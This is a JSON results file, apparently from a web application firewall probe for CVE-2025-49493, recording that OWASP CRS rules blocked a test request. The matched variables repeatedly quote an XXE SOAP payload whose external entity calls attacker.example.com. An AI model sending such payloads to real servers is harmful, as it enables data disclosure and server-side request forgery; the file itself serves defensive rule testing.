out/CVE-2025-49493/probe.json

{
  "status": "ok",
  "error": null,
  "results": [
    {
      "index": 0,
      "paranoia": 2,
      "blocked": true,
      "anomaly_score": {
        "inbound": 51,
        "threshold": 5,
        "to_block": 0,
        "score_pl1": 28,
        "score_pl2": 23
      },
      "matched_rules": [
        {
          "id": 920180,
          "tags": [
            "application-multi",
            "language-multi",
            "platform-multi",
            "attack-protocol",
            "paranoia-level/1",
            "OWASP_CRS",
            "OWASP_CRS/PROTOCOL-ENFORCEMENT",
            "capec/1000/210/272"
          ],
          "paranoia_level": 1,
          "msg": "POST without Content-Length and Transfer-Encoding headers",
          "matched_var": [
            "REQUEST_PROTOCOL",
            "REQUEST_METHOD",
            "REQUEST_HEADERS:content-length",
            "REQUEST_HEADERS:transfer-encoding"
          ],
          "variables": [
            {
              "variable": "REQUEST_PROTOCOL",
              "key": "",
              "value": "HTTP/1.1"
            },
            {
              "variable": "REQUEST_METHOD",
              "key": "",
              "value": "POST"
            },
            {
              "variable": "REQUEST_HEADERS",
              "key": "content-length",
              "value": "0"
            },
            {
              "variable": "REQUEST_HEADERS",
              "key": "transfer-encoding",
              "value": "0"
            }
          ]
        },
        {
          "id": 920420,
          "tags": [
            "application-multi",
            "language-multi",
            "platform-multi",
            "attack-protocol",
            "paranoia-level/1",
            "OWASP_CRS",
            "OWASP_CRS/PROTOCOL-ENFORCEMENT",
            "capec/1000/255/153"
          ],
          "paranoia_level": 1,
          "msg": "Request content type is not allowed by policy",
          "matched_var": [
            "REQUEST_HEADERS:Content-Type",
            "TX:content_type"
          ],
          "variables": [
            {
              "variable": "REQUEST_HEADERS",
              "key": "Content-Type",
              "value": "text/html"
            },
            {
              "variable": "TX",
              "key": "content_type",
              "value": "|text/html|"
            }
          ]
        },
        {
          "id": 920320,
          "tags": [
            "application-multi",
            "language-multi",
            "platform-multi",
            "attack-protocol",
            "paranoia-level/2",
            "OWASP_CRS",
            "OWASP_CRS/PROTOCOL-ENFORCEMENT",
            "capec/1000/210/272"
          ],
          "paranoia_level": 2,
          "msg": "Missing User Agent Header",
          "matched_var": [
            "REQUEST_HEADERS:user-agent"
          ],
          "variables": [
            {
              "variable": "REQUEST_HEADERS",
              "key": "user-agent",
              "value": "0"
            }
          ]
        },
        {
          "id": 921150,
          "tags": [
            "application-multi",
            "language-multi",
            "platform-multi",
            "attack-protocol",
            "paranoia-level/1",
            "OWASP_CRS",
            "OWASP_CRS/PROTOCOL-ATTACK",
            "capec/1000/210/272/220/33"
          ],
          "paranoia_level": 1,
          "msg": "HTTP Header Injection Attack via payload (CR/LF detected)",
          "matched_var": [
            "ARGS_NAMES:xxe;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>"
          ],
          "variables": [
            {
              "variable": "ARGS_NAMES",
              "key": "xxe;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>",
              "value": "xxe;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>"
            }
          ]
        },
        {
          "id": 931130,
          "tags": [
            "application-multi",
            "language-multi",
            "platform-multi",
            "attack-rfi",
            "paranoia-level/2",
            "OWASP_CRS",
            "OWASP_CRS/ATTACK-RFI",
            "capec/1000/152/175/253"
          ],
          "paranoia_level": 2,
          "msg": "Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link",
          "matched_var": [
            "ARGS:<?xml version",
            "TX:rfi_parameter_args:<?xml version"
          ],
          "variables": [
            {
              "variable": "ARGS",
              "key": "<?xml version",
              "value": "\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY xxe SYSTEM \"http://attacker.example.com/xxe-test\">\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>"
            },
            {
              "variable": "TX",
              "key": "rfi_parameter_args:<?xml version",
              "value": ".attacker.example.com"
            }
          ]
        },
        {
          "id": 941100,
          "tags": [
            "application-multi",
            "language-multi",
            "platform-multi",
            "attack-xss",
            "xss-perf-disable",
            "paranoia-level/1",
            "OWASP_CRS",
            "OWASP_CRS/ATTACK-XSS",
            "capec/1000/152/242"
          ],
          "paranoia_level": 1,
          "msg": "XSS Attack Detected via libinjection",
          "matched_var": [
            "ARGS_NAMES:<?xml version",
            "ARGS:<?xml version"
          ],
          "variables": [
            {
              "variable": "ARGS_NAMES",
              "key": "<?xml version",
              "value": "<?xml version"
            },
            {
              "variable": "ARGS",
              "key": "<?xml version",
              "value": "\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY xxe SYSTEM \"http://attacker.example.com/xxe-test\">\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>"
            }
          ]
        },
        {
          "id": 941130,
          "tags": [
            "application-multi",
            "language-multi",
            "platform-multi",
            "attack-xss",
            "xss-perf-disable",
            "paranoia-level/1",
            "OWASP_CRS",
            "OWASP_CRS/ATTACK-XSS",
            "capec/1000/152/242"
          ],
          "paranoia_level": 1,
          "msg": "XSS Filter - Category 3: Attribute Vector",
          "matched_var": [
            "ARGS:<?xml version"
          ],
          "variables": [
            {
              "variable": "ARGS",
              "key": "<?xml version",
              "value": "\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY xxe SYSTEM \"http://attacker.example.com/xxe-test\">\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>"
            }
          ]
        },
        {
          "id": 941340,
          "tags": [
            "application-multi",
            "language-multi",
            "platform-multi",
            "attack-xss",
            "xss-perf-disable",
            "paranoia-level/2",
            "OWASP_CRS",
            "OWASP_CRS/ATTACK-XSS",
            "capec/1000/152/242"
          ],
          "paranoia_level": 2,
          "msg": "IE XSS Filters - Attack Detected",
          "matched_var": [
            "ARGS:<?xml version"
          ],
          "variables": [
            {
              "variable": "ARGS",
              "key": "<?xml version",
              "value": "\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE soapenv:Envelope [ <!ENTITY xxe SYSTEM \"http://attacker.example.com/xxe-test\"> ]> <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:rep=\"http://example.com/services/repository\"> <soapenv:Header/> <soapenv:Body> <rep:getUIBundleObjectXml> <rep:uiBundleRequestXml>"
            }
          ]
        },
        {
          "id": 942430,
          "tags": [
            "application-multi",
            "language-multi",
            "platform-multi",
            "attack-sqli",
            "paranoia-level/2",
            "OWASP_CRS",
            "OWASP_CRS/ATTACK-SQLI",
            "capec/1000/152/248/66"
          ],
          "paranoia_level": 2,
          "msg": "Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)",
          "matched_var": [
            "ARGS_NAMES:xxe;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>",
            "ARGS:<?xml version"
          ],
          "variables": [
            {
              "variable": "ARGS_NAMES",
              "key": "xxe;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>",
              "value": "xxe;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>"
            },
            {
              "variable": "ARGS",
              "key": "<?xml version",
              "value": "\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY xxe SYSTEM \"http://attacker.example.com/xxe-test\">\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>"
            }
          ]
        },
        {
          "id": 942520,
          "tags": [
            "application-multi",
            "language-multi",
            "platform-multi",
            "attack-sqli",
            "paranoia-level/2",
            "OWASP_CRS",
            "OWASP_CRS/ATTACK-SQLI",
            "capec/1000/152/248/66"
          ],
          "paranoia_level": 2,
          "msg": "Detects basic SQL authentication bypass attempts 4.0/4",
          "matched_var": [
            "ARGS:<?xml version"
          ],
          "variables": [
            {
              "variable": "ARGS",
              "key": "<?xml version",
              "value": "\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY xxe SYSTEM \"http://attacker.example.com/xxe-test\">\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>"
            }
          ]
        }
      ]
    }
  ]
}